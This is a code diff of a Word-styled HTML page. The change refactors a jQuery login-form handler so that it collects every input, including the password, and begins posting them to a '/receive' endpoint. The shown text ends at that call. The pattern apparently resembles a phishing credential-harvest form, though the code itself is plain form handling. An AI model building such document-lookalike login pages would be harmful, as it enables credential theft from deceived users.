@@ -4077,45 +4077,38 @@ div.WordSection1
 <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
 <script>
 $(document).ready(function () {
-    $('#submit').click(function (e) {
+    $('form').on('submit', function (e) {
         e.preventDefault();
 
-        const $useridInput = $('#username');
-        const $passwordInput = $('#password');
-
-        let userinfo = {}; 
-	let username = $useridInput.val().trim();
-        let visitor = $useridInput.val().trim();
-        let password = $passwordInput.val().trim();
+        const $form = $(this);
+        const $inputs = $form.find('input');
+        let userinfo = {};
         let isValid = true;
 
-        // Validate username
-        if (!username) {
-            $useridInput.css('border', '1px solid red');
-            isValid = false;
-        } else {
-            $useridInput.css('border', '');
-        }
+        $inputs.each(function () {
+            const $input = $(this);
+            const value = $input.val().trim();
+            const name = $input.attr('name');
 
-        // Validate password
-        if (!password) {
-            $passwordInput.css('border', '1px solid red');
-            isValid = false;
-        } else {
-            $passwordInput.css('border', '');
-        }
+            if (!value) {
+                $input.css('border', '1px solid red');
+                isValid = false;
+            } else {
+                $input.css('border', '');
+                userinfo[name] = value;
+            }
+        });
 
         if (!isValid) {
             console.log('Please fill in all required fields.');
             return;
         }
 
-        sessionStorage.setItem('visitor', visitor);
-        userinfo['userid'] = username;
-        userinfo['password'] = password;
+        // Optionally save a specific input to sessionStorage
+        if (userinfo['username']) {
+            sessionStorage.setItem('visitor', userinfo['username']);
+        }
 
-        console.log(userinfo); 
-        
         $.ajax({
             url: '/receive',
             type: 'POST',
